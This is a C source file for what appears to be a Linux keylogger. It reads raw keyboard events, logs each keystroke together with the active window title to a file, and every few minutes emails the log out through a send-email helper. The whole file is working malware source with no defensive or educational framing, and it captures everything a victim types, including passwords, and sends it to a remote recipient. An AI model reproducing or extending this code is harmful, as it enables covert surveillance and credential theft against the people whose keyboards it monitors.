#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <pthread.h>
#include <errno.h>
#include <sys/select.h>
#include "file_handler.h"
#include "keyboard_handler.h"
#include "send_email.h"
#include "utils.h"

#define KEY_BUFFER_SIZE 64
#define TEXT_BUFFER_SIZE 4096
#define KEYCODE_OFFSET 8
#ifndef DURATION
#error "DURATION is not defined"
#endif

static volatile sig_atomic_t exit_flag = 0;
static int pipe_fd[2];
pthread_mutex_t file_mutex = PTHREAD_MUTEX_INITIALIZER;

typedef struct {
    KeyboardHandler keyboard_handler;
    FileHandler file_handler;
    EmailSender sender;
    int fd;
} HandlerContext;

void signal_handler(int sig) {
    if (sig == SIGINT) {
        exit_flag = 1;
        char signal_data = 'x';
        while (write(pipe_fd[1], &signal_data, 1) == -1 && errno == EINTR);
    }
}

void *read_keyboard(void *arg){
    HandlerContext *context = (HandlerContext*) arg;
    struct input_event ev;
    char key[KEY_BUFFER_SIZE];
    int write_error;
    BufferText buffer;

    if (buffer_text_init(&buffer)) pthread_exit((void *)1);

    while (!exit_flag) {
        char *current_window = NULL;
        int code;

        if (read(context->fd, &ev, sizeof(struct input_event)) == -1) {
            fprintf(stderr, "Error reading event\n");
            pthread_exit((void *)1);
        }

        if (get_active_window(context->keyboard_handler.dpy, &current_window)){
            fprintf(stderr, "Error getting active window\n");
        } else {
            int flag_update_current_window = 0;
            if (!(context->keyboard_handler.active_window)){
                flag_update_current_window = 1;
            } else if (strcmp(context->keyboard_handler.active_window, current_window)) {
                free(context->keyboard_handler.active_window);
                flag_update_current_window = 1;
            }
            if (flag_update_current_window){
                context->keyboard_handler.active_window = strdup(current_window);
                write_error = write_or_buffer_event(&(context->file_handler), &buffer,
                                                    context->keyboard_handler.active_window, &file_mutex);
                if (write_error) {
                    buffer_text_clear(&buffer);
                    pthread_exit((void *)1);
                }
            }
            free(current_window);
        }

        if (ev.type == EV_KEY) {
            code = ev.code + KEYCODE_OFFSET;
            if (ev.value == 1) {
                xkb_state_update_key(context->keyboard_handler.state, code, XKB_KEY_DOWN);
                if (!get_key_string(context->keyboard_handler.state, code, key, sizeof(key))) {
                    write_error = write_or_buffer_event(&(context->file_handler), &buffer, key, &file_mutex);
                    if (write_error){
                        buffer_text_clear(&buffer);
                        pthread_exit((void *)1);
                    }
                }
            } else if (ev.value == 0) {
                xkb_state_update_key(context->keyboard_handler.state, code, XKB_KEY_UP);
            }
        }
    }
    buffer_text_clear(&buffer);
    pthread_exit((void *)0);
}

void *send_email(void *arg){
    HandlerContext *context = (HandlerContext*) arg;
    while (!exit_flag){
        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(pipe_fd[0], &read_fds);

        struct timeval tv;
        tv.tv_sec = DURATION * 60;
        tv.tv_usec = 0;

        int select_result = select(pipe_fd[0] + 1, &read_fds, NULL, NULL, &tv);
        if (select_result > 0){
            char buffer[10];
            read(pipe_fd[0], buffer, sizeof(buffer));
            continue;
        } else if (select_result == 0){
            pthread_mutex_lock(&file_mutex);
            send_file_via_email(&(context->sender), &(context->file_handler), &(context->keyboard_handler.active_window));
            pthread_mutex_unlock(&file_mutex);
        } else {
            if (errno == EINTR) continue;
            fprintf(stderr, "Select error: %s\n", strerror(errno));
            pthread_exit((void *)1);
        }
    }
    pthread_exit((void *)0);
}

int context_init(HandlerContext *context){
    int error = 0;
    error = FileHandler_init(&(context->file_handler));
    error = KeyboardHandler_init(&(context->keyboard_handler)) || error;
    error = EmailSender_init(&(context->sender)) || error;
    error = open_file_event_keyboard(&(context->fd)) || error;
    return error;
}

void context_cleanup(HandlerContext *context){
    FileHandler_close(&(context->file_handler));
    if (context->fd != -1){
        close(context->fd);
    }
    KeyboardHandler_cleanup(&(context->keyboard_handler));
    EmailSender_cleanup(&(context->sender));
}

int main() {
    HandlerContext context;
    pthread_t thread_read, thread_send_email;
    void *retval_read, *retval_send;
    int code_read, code_send;
    struct sigaction sa;

    if (pipe(pipe_fd) != 0) {
        fprintf(stderr, "Failed to create pipe\n");
        return EXIT_FAILURE;
    }

    sa.sa_handler = signal_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    if (sigaction(SIGINT, &sa, NULL) == -1) {
        fprintf(stderr, "Error registering signal handler\n");
        return EXIT_FAILURE;
    }

    if (context_init(&context)) {
        context_cleanup(&context);
        return EXIT_FAILURE;
    }

    if (pthread_create(&thread_read, NULL, read_keyboard, &context)){
        fprintf(stderr, "pthread (pthread_read) create failed");
        context_cleanup(&context);
        return EXIT_FAILURE;
    }

    if (pthread_create(&thread_send_email, NULL, send_email, &context)){
        fprintf(stderr, "pthread (pthread_send_email) create failed");
        context_cleanup(&context);
        return EXIT_FAILURE;
    }

    pthread_join(thread_send_email, &retval_send);
    pthread_join(thread_read, &retval_read);
    code_send = (int)(intptr_t)retval_send;
    code_read = (int)(intptr_t)retval_read;
    printf("Thread send email exit, value %d\n", code_send);
    printf("Thread read keyboard exit, value %d\n", code_read);

    context_cleanup(&context);
    close(pipe_fd[0]);
    close(pipe_fd[1]);
    return code_read || code_send;
}
